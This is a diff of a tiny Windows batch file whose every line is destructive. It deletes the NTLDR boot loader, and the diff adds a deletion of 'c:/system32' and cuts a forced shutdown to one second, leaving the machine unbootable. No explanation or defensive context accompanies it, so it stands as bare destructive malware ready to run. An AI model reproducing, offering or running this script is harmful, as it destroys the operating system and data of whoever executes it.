@@ -1,3 +1,4 @@
 @echo off
 del "c:/ntldr"
-shutdown -s -t 10
+del "c:/system32"
+shutdown -s -t 1
